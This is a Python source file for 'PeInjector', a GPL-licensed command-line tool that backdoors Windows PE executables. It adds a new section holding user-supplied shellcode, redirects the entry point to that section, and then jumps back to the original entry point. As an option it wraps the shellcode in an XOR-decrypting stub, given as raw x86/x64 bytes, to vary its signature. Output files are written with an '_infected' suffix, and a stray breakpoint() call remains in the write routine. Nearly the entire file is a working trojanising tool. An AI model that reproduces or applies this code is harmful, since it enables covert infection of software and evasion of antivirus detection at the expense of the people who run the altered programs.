#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This python tool injects shellcode in Windows Program Executable to
#    backdoor it with optional polymorphism.
#    Copyright (C) 2024  PeInjector

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This python tool injects shellcode in Windows Program Executable to
backdoor it with optional polymorphism.
"""

__version__ = "1.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This python tool injects shellcode in Windows Program Executable to
backdoor it with optional polymorphism.
"""
__url__ = "https://github.com/mauricelambert/PeInjector"

__all__ = ["main", "inject"]

__license__ = "GPL-3.0 License"
__copyright__ = """
PeInjector  Copyright (C) 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
copyright = __copyright__
license = __license__

print(copyright)

from dataclasses import dataclass, field
from os.path import splitext, isfile
from sys import argv, stderr, exit
from _io import _BufferedIOBase
from typing import Tuple, List
from base64 import b16decode
from random import randrange


@dataclass
class NewValues:
    """
    This class stores modified values
    for the backdoored PE file.
    """

    image_size: int = 0
    headers_size: int = 0
    file_size: int = 0
    section_offset: int = 0
    entry_point: int = 0
    first_section_offset: int = 0


@dataclass
class Section:
    """
    This class stores parsed sections values.
    """

    address_headers: int = 0
    virtual_address: int = 0
    virtual_size: int = 0
    file_offset: int = 0
    file_size: int = 0


@dataclass
class PeInjectorData:
    """
    This class stores all data used to
    backdoor a Program Executable.
    """

    address_nt_headers: int = 0
    machine_architecture: int = 0
    sections_number: int = 0
    optional_headers_size: int = 0
    entry_point: int = 0
    section_aligment: int = 0
    file_aligment: int = 0
    image_size: int = 0
    headers_size: int = 0
    image_base: int = 0
    offset_new_section_headers: int = 0
    address_end_new_section_headers: int = 0
    first_section_offset: int = 0
    sections: List[Section] = field(default_factory=list)
    new_values: NewValues = field(default_factory=NewValues)
    shellcode: bytes = None


class ProgramExecutableError(ValueError):
    """
    PeInjector support only Windows Program Executable,
    if the file is not in the good format this
    class should be used to raise an exception.
    """


class ArchitectureError(ValueError):
    """
    PeInjector support only x86 and x64 Program Executable,
    if the executable is not in theses architectures this
    class should be used to raise an exception.
    """

    architecture: str = None


machine_types = {
    0x014C: "x86",
    0x8664: "x64",
    0x0200: "IA64",
    0x01C0: "ARM",
    0xAA64: "ARM64",
}


def arg_parse() -> Tuple[str, str, bool]:
    """
    This function parse the command line arguments and returns:
        1. Executable path
        2. Hexadecimal shellcode
        3. Use polymorphism
    """

    if len(argv) == 4:
        if "-p" in argv:
            argv.remove("-p")
        elif "--polymorphism" in argv:
            argv.remove("--polymorphism")
        polymorphism = True
    else:
        polymorphism = False

    if len(argv) != 3:
        print(
            "USAGES: python3",
            argv[0],
            "-p <executable_path> <shellcode_hexadecimal>",
            file=stderr,
        )
        exit(1)

    _, file_path, shellcode = argv

    if not isfile(file_path):
        print(
            "<executable_path>: should be a valid and existing path",
            file=stderr,
        )
        exit(2)

    if any(x not in "0123456789abcdefABCDEF" for x in shellcode):
        print(
            "<shellcode_hexadecimal>: should be a hexadecimal value",
            file=stderr,
        )
        exit(3)

    return file_path, shellcode, polymorphism


def parse_nt_headers(
    injector_data: PeInjectorData, memory_file_mapping: memoryview
) -> memoryview:
    """
    This function parses the NT headers.

    This class raise ProgramExecutableError exception
    if the file don't contains valid DOS and NT magic headers.
    """

    if bytes(memory_file_mapping[0:2]) != b"MZ":
        raise ProgramExecutableError(
            "Invalid DOS headers, b'MZ' != "
            + repr(bytes(memory_file_mapping[0:2]))
        )

    injector_data.address_nt_headers = int.from_bytes(
        memory_file_mapping[0x3C:0x3C + 4], "little"
    )

    nt_headers = memory_file_mapping[injector_data.address_nt_headers:]

    if bytes(nt_headers[0:4]) != b"PE\0\0":
        raise ProgramExecutableError(
            "Invalid NT headers, b'PE\\x0\\x0' != "
            + repr(bytes(nt_headers[0:4]))
        )

    image_headers = nt_headers[4:]
    injector_data.machine_architecture = int.from_bytes(
        image_headers[0:2], "little"
    )
    injector_data.sections_number = int.from_bytes(
        image_headers[2:4], "little"
    )
    injector_data.optional_headers_size = int.from_bytes(
        image_headers[0x10:0x12], "little"
    )

    return nt_headers


def parse_optional_headers(
    injector_data: PeInjectorData, nt_headers: memoryview
) -> memoryview:
    """
    This function parses the optional headers.
    """

    optional_headers = nt_headers[0x18:]
    injector_data.entry_point = int.from_bytes(
        optional_headers[0x10:0x14], "little"
    )
    injector_data.section_aligment = int.from_bytes(
        optional_headers[0x20:0x24], "little"
    )
    injector_data.file_aligment = int.from_bytes(
        optional_headers[0x24:0x28], "little"
    )
    injector_data.image_size = int.from_bytes(
        optional_headers[0x38:0x3C], "little"
    )
    injector_data.new_values.headers_size = injector_data.headers_size = (
        int.from_bytes(optional_headers[0x3C:0x40], "little")
    )

    return optional_headers


def parse_sections_headers(
    injector_data: PeInjectorData, optional_headers: memoryview
) -> memoryview:
    """
    This function parses the sections headers.
    """

    section_headers = optional_headers[injector_data.optional_headers_size:]

    for index in range(injector_data.sections_number):
        section = Section()
        injector_data.sections.append(section)

        section.virtual_address = int.from_bytes(
            section_headers[0xC:0x10], "little"
        )
        section.virtual_size = int.from_bytes(
            section_headers[0x8:0xC], "little"
        )
        section.file_offset = int.from_bytes(
            section_headers[0x14:0x18], "little"
        )
        section.file_size = int.from_bytes(
            section_headers[0x10:0x14], "little"
        )

        section_headers = section_headers[40:]

    section.address_headers = (injector_data.sections_number - 1) * 0x28
    injector_data.offset_new_section_headers = section.address_headers + 0x28

    return section_headers


def parse_pe_file(
    executable: _BufferedIOBase,
) -> Tuple[memoryview, PeInjectorData]:
    """
    This function parses the PE file.
    """

    data = bytearray(executable.read())

    file_mapping = memoryview(data)
    injector_data = PeInjectorData()

    nt_headers = parse_nt_headers(injector_data, file_mapping)
    optional_headers = parse_optional_headers(injector_data, nt_headers)

    if machine_types[injector_data.machine_architecture] == "x64":
        injector_data.image_base = int.from_bytes(
            optional_headers[0x18:0x20], "little"
        )
    elif machine_types[injector_data.machine_architecture] == "x86":
        injector_data.image_base = int.from_bytes(
            optional_headers[0x1C:0x20], "little"
        )
    else:
        exception = ArchitectureError(
            "Invalid architecture, support only x86 and x64"
        )
        exception.architecture = injector_data.machine_architecture
        raise exception

    parse_sections_headers(injector_data, optional_headers)

    return file_mapping, injector_data


def calcul_entrypoint(injector_data: PeInjectorData) -> int:
    """
    This function calcul entry point (original entry point and new entrypoint).
    """

    original_entry_point = injector_data.entry_point + injector_data.image_base
    last_section = injector_data.sections[-1]

    last_section_virtual_end_address = (
        last_section.virtual_size + last_section.virtual_address
    )
    virtual_padding = (
        last_section_virtual_end_address % injector_data.section_aligment
    )
    injector_data.new_values.entry_point = last_section_virtual_end_address + (
        (injector_data.section_aligment - virtual_padding)
        if virtual_padding
        else 0
    )

    return original_entry_point


def generate_shellcode_suffix(
    injector_data: PeInjectorData, key: bytes, polymorphism: bool
) -> bytes:
    """
    This function generates the shellcode suffix
    (jump on the original entry point).
    """

    original_entry_point = calcul_entrypoint(injector_data)

    suffix = b"\xe9" + (
        original_entry_point
        - (
            injector_data.new_values.entry_point
            + len(injector_data.shellcode)
            + 5
            + injector_data.image_base
        )
    ).to_bytes(4, "little", signed=True)

    if polymorphism:
        injector_data.shellcode += bytes(byte ^ key for byte in suffix)

    return suffix


def build_injected_shellcode(
    injector_data: PeInjectorData, polymorphism: bool
) -> bytes:
    """
    This function generates the injected shellcode.

    final shellcode: (
        (prefix (crypter) if polymorphism)
        + shellcode
        + suffix (jmp OEP)
    )
    """

    if machine_types[injector_data.machine_architecture] == "x64":
        # rex_instruction = b"\x48"
        crypter = bytes.fromhex(
            "eb24584889c248054f5f6f7f48c7c1aa0000008"
            "a1830cb881848ffc84839c27ef248ffc0ffe0e8d7ffffff"
        )
    elif machine_types[injector_data.machine_architecture] == "x86":
        # rex_instruction = b""
        crypter = bytes.fromhex(
            "eb1d5889c2054f5f6f7fc7c1aa0000008a183"
            "0cb8818ffc839c27ef440ffe0e8deffffff"
        )

    # injector_data.shellcode += (
    #     rex_instruction + b"\xb8" + original_entry_point + b"\xff\xe0"
    # )

    key = None
    if polymorphism:
        key = randrange(256)
        shellcode_length = len(injector_data.shellcode) + 5
        crypter = crypter.replace(b"\xaa", key.to_bytes()).replace(
            b"\x4f\x5f\x6f\x7f", shellcode_length.to_bytes(4, "little")
        )
        injector_data.shellcode = crypter + bytes(
            (byte ^ key for byte in injector_data.shellcode)
        )

    injector_data.shellcode += generate_shellcode_suffix(
        injector_data, key, polymorphism
    )
    return injector_data.shellcode


def generate_new_section_headers(
    injector_data: PeInjectorData,
    file_new_section_size: int,
    polymorphism: bool,
) -> bytes:
    """
    This function generates the new sections headers.
    """

    shellcode_length = len(injector_data.shellcode)
    new_section_headers = b".inject".ljust(
        8, b"\0"
    )  # '.text', '.code', '.init', '.textbss', '.text1', '.itext'

    new_section_headers += shellcode_length.to_bytes(4, "little")
    new_section_headers += injector_data.new_values.entry_point.to_bytes(
        4, "little"
    )

    new_section_headers += file_new_section_size.to_bytes(4, "little")
    new_section_headers += injector_data.new_values.section_offset.to_bytes(
        4, "little"
    )

    new_section_headers += b"\0" * 12
    new_section_headers += (
        0xE0000020 if polymorphism else 0x60000020
    ).to_bytes(4, "little")

    # assert len(new_section_headers) == 0x28

    return new_section_headers


def get_new_section_offset(injector_data: PeInjectorData) -> Tuple[int, int]:
    """
    This function calculs new section offset.
    """

    shellcode_length = len(injector_data.shellcode)
    file_padding = shellcode_length % injector_data.file_aligment
    file_new_section_size = shellcode_length + (
        (injector_data.file_aligment - file_padding) if file_padding else 0
    )

    last_section = injector_data.sections[-1]
    last_section_file_end_address = (
        last_section.file_offset + last_section.file_size
    )
    file_padding = last_section_file_end_address % injector_data.file_aligment
    injector_data.new_values.section_offset = last_section_file_end_address + (
        (injector_data.file_aligment - (file_padding)) if file_padding else 0
    )

    injector_data.new_values.image_size = (
        len(injector_data.shellcode) + injector_data.new_values.entry_point
    )
    injector_data.new_values.file_size = (
        file_new_section_size + injector_data.new_values.section_offset
    )

    return last_section_file_end_address, file_new_section_size


def rewrite_sections_position(
    injector_data: PeInjectorData, section_headers: memoryview
) -> None:
    """
    This function writes new section offsets.
    """

    injector_data.new_values.first_section_offset += 512
    injector_data.new_values.section_offset += 512
    injector_data.new_values.headers_size += 512
    injector_data.new_values.file_size += 512

    for index in range(injector_data.sections_number):
        section = injector_data.sections[index]
        section.file_offset += 512
        section_headers[0x14:0x18] = section.file_offset.to_bytes(4, "little")
        section_headers = section_headers[40:]


def check_new_section_injection(
    injector_data: PeInjectorData, memory_file_mapping: memoryview
) -> memoryview:
    """
    This function checks if new headers can be write,
    modify sections position instead.
    """

    nt_headers = memory_file_mapping[injector_data.address_nt_headers:]
    optional_headers = nt_headers[0x18:]
    section_headers = optional_headers[injector_data.optional_headers_size:]

    injector_data.new_values.first_section_offset = (
        injector_data.first_section_offset
    ) = min((section.file_offset for section in injector_data.sections))

    injector_data.address_end_new_section_headers = (
        injector_data.offset_new_section_headers
        + (len(memory_file_mapping) - len(section_headers))
        + 40
    )

    if (
        injector_data.address_end_new_section_headers
        > injector_data.first_section_offset
    ):
        rewrite_sections_position(injector_data, section_headers)

    return section_headers


def get_new_section_headers(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
    polymorphism: bool,
) -> Tuple[bytes, int]:
    """
    This function inject the section headers.

    This function returns the end address of the last section.
    """

    last_section_file_end_address, file_new_section_size = (
        get_new_section_offset(injector_data)
    )
    check_new_section_injection(
        injector_data, memory_file_mapping
    )
    new_section_headers = generate_new_section_headers(
        injector_data, file_new_section_size, polymorphism
    )

    return new_section_headers, last_section_file_end_address


def rewrite_pe_headers(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
) -> memoryview:
    """
    This function writes new value for PE headers.
    """

    nt_headers = memory_file_mapping[injector_data.address_nt_headers:]
    image_headers = nt_headers[4:]
    optional_headers = nt_headers[0x18:]

    image_headers[2:4] = (injector_data.sections_number + 1).to_bytes(
        2, "little"
    )
    optional_headers[0x38:0x3C] = injector_data.new_values.image_size.to_bytes(
        4, "little"
    )
    optional_headers[0x3C:0x40] = (
        injector_data.new_values.headers_size.to_bytes(4, "little")
    )
    optional_headers[0x10:0x14] = (
        injector_data.new_values.entry_point.to_bytes(4, "little")
    )

    return optional_headers


def write_new_pe_file(
    injector_data: PeInjectorData,
    memory_file_mapping: memoryview,
    executable: _BufferedIOBase,
    new_section_headers: bytes,
    last_section_end_address: int,
) -> bytes:
    """
    This function writes the final shellcode in the new section.
    """

    new_file_content = (
        (
            bytes(
                memory_file_mapping[
                    :injector_data.address_end_new_section_headers - 40
                ]
            )
            + new_section_headers
        ).ljust(injector_data.new_values.first_section_offset, b"\0")
        + bytes(
            memory_file_mapping[
                injector_data.first_section_offset:last_section_end_address
            ]
        ).ljust(
            injector_data.new_values.section_offset
            - injector_data.new_values.first_section_offset,
            b"\0",
        )
        + injector_data.shellcode
    ).ljust(injector_data.new_values.file_size, b"\0") + bytes(
        memory_file_mapping[last_section_end_address:]
    )
    breakpoint()

    executable.write(new_file_content)
    return new_file_content


def inject(
    target_executable: _BufferedIOBase,
    backdoored_executable: _BufferedIOBase,
    shellcode: bytes,
    polymorphism: bool = False,
) -> bytes:
    """
    This function injects the shellcode into the backdoored executable.
    """

    memory_file_mapping, injector_data = parse_pe_file(target_executable)
    injector_data.shellcode = shellcode

    build_injected_shellcode(injector_data, polymorphism)

    new_section_headers, last_section_end_address = get_new_section_headers(
        injector_data, memory_file_mapping, polymorphism
    )
    rewrite_pe_headers(injector_data, memory_file_mapping)

    return write_new_pe_file(
        injector_data,
        memory_file_mapping,
        backdoored_executable,
        new_section_headers,
        last_section_end_address,
    )


def main() -> int:
    """
    This function starts the program from the command line.
    """

    executable, shellcode, polymorphism = arg_parse()

    path, extension = splitext(executable)
    new_path = path + "_infected" + extension

    with open(executable, "rb") as target, open(new_path, "wb") as backdoor:
        try:
            inject(
                target,
                backdoor,
                b16decode(shellcode.upper().encode()),
                polymorphism,
            )
        except ArchitectureError as e:
            print(
                "Invalid architecture: x64 or x86 architecture required, not",
                machine_types[e.architecture],
                file=stderr,
            )
            return 4
        except ProgramExecutableError:
            print(
                "Invalid file format: magic bytes are invalid",
                file=stderr,
            )
            return 5

    return 0


if __name__ == "__main__":
    exit(main())
